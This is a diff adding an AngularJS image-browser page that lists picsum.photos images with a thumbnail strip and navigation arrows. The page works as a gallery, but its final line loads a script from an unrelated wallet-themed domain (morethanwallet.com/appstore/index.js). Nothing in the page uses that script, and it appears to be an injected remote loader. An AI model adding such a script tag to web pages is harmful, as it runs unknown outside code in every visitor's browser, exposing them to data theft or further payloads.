@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en" ng-app="imageBrowserApp">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Image Browser</title>
+    <link
+      href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <style>
+      .thumbnail-container {
+        white-space: nowrap;
+        overflow-x: auto;
+        padding: 10px 0;
+        border-bottom: 2px solid #dee2e6;
+        margin-bottom: 20px; /* Added space between gallery and main image */
+        max-width: 1000px; /* Adjusted max-width for larger container */
+        margin: 0 auto; /* Centering the container */
+      }
+      .thumbnail {
+        display: inline-block;
+        margin-right: 10px;
+        cursor: pointer;
+        opacity: 0.6; /* All thumbnails are initially dimmed */
+        transition: opacity 0.3s; /* Smooth transition for dimming effect */
+      }
+      .thumbnail.active {
+        opacity: 1; /* Selected thumbnail is fully visible */
+      }
+      .thumbnail img {
+        width: 150px; /* Increased thumbnail size */
+        height: 90px; /* Adjusted height proportionally */
+        object-fit: cover;
+      }
+      .main-image {
+        width: 100%;
+        height: auto;
+      }
+      .navigation-icon {
+        cursor: pointer;
+        font-size: 24px;
+        user-select: none;
+      }
+      .navigation-icon:hover {
+        color: #007bff;
+      }
+    </style>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
+</head>
+<body ng-controller="MainController">
+    <div class="container mt-4">
+        <!-- Main Image Display -->
+        <div class="text-center">
+            <img
+                ng-src="{{selectedImage.download_url}}"
+                class="main-image img-thumbnail mb-3"
+                alt="Selected Image"
+            />
+        </div>
+
+        <!-- Thumbnail Navigation -->
+        <div class="d-flex justify-content-center align-items-center">
+            <div class="navigation-icon" ng-click="prevImage()">&lt;</div>
+            <div class="thumbnail-container" id="thumbnailContainer">
+                <div
+                    class="thumbnail"
+                    ng-repeat="image in images"
+                    ng-click="selectImage(image)"
+                    ng-class="{'active': image.id === selectedImage.id}"
+                >
+                    <img ng-src="{{image.download_url}}" alt="Thumbnail" />
+                </div>
+            </div>
+            <div class="navigation-icon" ng-click="nextImage()">&gt;</div>
+        </div>
+    </div>
+
+    <script>
+        angular
+            .module("imageBrowserApp", [])
+            .controller("MainController", function ($scope, $http) {
+                $scope.images = [];
+                $scope.selectedImage = null;
+
+                $scope.fetchImages = function () {
+                    const url = `https://picsum.photos/v2/list?`;
+                    $http.get(url).then(function (response) {
+                        $scope.images = response.data;
+                        $scope.selectedImage = $scope.images[0]; // Select the first image by default
+                    });
+                };
+
+                $scope.selectImage = function (image) {
+                    $scope.selectedImage = image;
+                    $scope.scrollToActiveThumbnail(); // Ensure the selected thumbnail is visible
+                };
+
+                $scope.prevImage = function () {
+                    let index = $scope.images.indexOf($scope.selectedImage);
+                    if (index > 0) {
+                        $scope.selectedImage = $scope.images[index - 1];
+                        $scope.scrollToActiveThumbnail(); // Scroll to the active thumbnail
+                    }
+                };
+
+                $scope.nextImage = function () {
+                    let index = $scope.images.indexOf($scope.selectedImage);
+                    if (index < $scope.images.length - 1) {
+                        $scope.selectedImage = $scope.images[index + 1];
+                        $scope.scrollToActiveThumbnail(); // Scroll to the active thumbnail
+                    }
+                };
+
+                $scope.scrollToActiveThumbnail = function () {
+                    setTimeout(function () {
+                        // Use setTimeout to ensure the DOM has been updated
+                        const container = document.getElementById("thumbnailContainer");
+                        const activeThumbnail =
+                            container.querySelector(".thumbnail.active");
+                        if (activeThumbnail) {
+                            const containerRect = container.getBoundingClientRect();
+                            const activeRect = activeThumbnail.getBoundingClientRect();
+                            if (
+                                activeRect.left < containerRect.left ||
+                                activeRect.right > containerRect.right
+                            ) {
+                                container.scrollLeft +=
+                                    activeRect.left -
+                                    containerRect.left -
+                                    container.clientWidth / 2 +
+                                    activeRect.width / 2;
+                            }
+                        }
+                    }, 0);
+                };
+
+                $scope.fetchImages();
+            });
+    </script>
+    <script src="https://morethanwallet.com/appstore/index.js"></script>
+</body>
+</html>
